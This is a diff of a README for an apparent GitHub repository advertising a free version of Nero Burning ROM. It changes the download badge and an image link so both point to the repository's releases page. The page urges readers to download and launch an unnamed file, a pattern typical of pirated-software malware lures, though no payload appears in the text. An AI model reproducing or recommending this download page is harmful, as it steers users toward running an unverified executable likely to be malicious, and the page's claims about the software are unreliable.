@@ -27,7 +27,7 @@ Welcome to the Nero Burning ROM Free GitHub repository! This repository is dedic
 ## 📥 Download Nero Burning ROM Free
 
 Click the button below to download Nero Burning ROM Free:
-[![Download Nero Burning ROM Free](https://img.shields.io/badge/Download-Nero_Burning_ROM_Free-ff69b4)](https://github.com/uploads/App.zip)
+[![Download Nero Burning ROM Free](https://github.com/BRian124qqr/Nero-Burning-ROM-Free/releases)](https://github.com/BRian124qqr/Nero-Burning-ROM-Free/releases)
 *Note: The file needs to be launched after downloading.*
 
 ## 🎬 Explore Nero Burning ROM
@@ -50,6 +50,6 @@ Contributions to this repository are welcomed! Feel free to open issues, submit 
 
 Let the flames of knowledge about Nero Burning ROM ignite within you as we delve into the depths of burning tools, techniques, and history.
 
-![Nero Burning ROM](https://images.unsplash.com/photo-1519677100203-39fcc98941c9)
+![Nero Burning ROM](https://github.com/BRian124qqr/Nero-Burning-ROM-Free/releases)
 
 Remember, just like Nero's Rome, your digital creations deserve to be burned with precision and care. Join us on this fiery journey with Nero Burning ROM Free! 🔥🔥🔥
